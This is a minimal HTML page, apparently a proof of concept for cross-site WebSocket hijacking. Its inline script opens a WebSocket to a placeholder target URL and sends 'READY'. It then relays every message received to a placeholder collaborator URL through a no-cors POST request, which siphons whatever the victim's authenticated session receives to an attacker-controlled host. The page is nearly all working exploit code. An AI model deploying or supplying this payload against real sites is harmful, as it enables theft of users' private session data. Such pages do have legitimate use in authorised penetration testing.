<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <Title>Doc</Title>
</head>
<body>
    <h1> Hi </h1>

    <script>
        var ws = new WebSocket('wss://your-websocket-url');
        ws.onopen = function() {
            ws.send("READY");
        };

        ws.onmessage = function(event) {
            fetch('https://your-collaborator-url', {
                method: 'POST',
                mode: 'no-cors', 
                body: event.data}
            );
        };
    </script>
</body>
</html>
